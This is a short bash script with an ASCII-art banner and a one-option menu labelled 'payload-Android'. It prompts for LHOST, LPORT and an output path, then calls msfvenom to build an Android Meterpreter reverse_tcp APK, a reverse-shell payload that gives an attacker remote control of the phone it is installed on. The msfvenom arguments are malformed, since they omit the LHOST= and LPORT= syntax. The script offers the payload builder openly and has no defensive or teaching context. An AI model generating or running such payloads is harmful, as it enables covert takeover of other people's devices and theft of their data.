echo "
..#....#..
..#....#..
..######..
..#....#..
..#....#..

----¥¥----

..#...#...
..#..#....
..##......
..#..#....
..#...#...

----€€----

..#...#...
..#..#....
..##......
..#..#....
..#...#...

----¢¢----

..#.......
..#.......
..#.......
..#.......
..######..
 "
echo "1 = payload-Android"
read choisse 
if [[ $choisse -eq 1 ]]; then
    echo "Enter the LHOST: :"
    read lhost
    echo "Enter the LPORT: :"
    read lport
    echo "Enter the path apk :"
    read pt
    
    msfvenom -p android/meterpreter/reverse_tcp $lhost $lport R > $pt
fi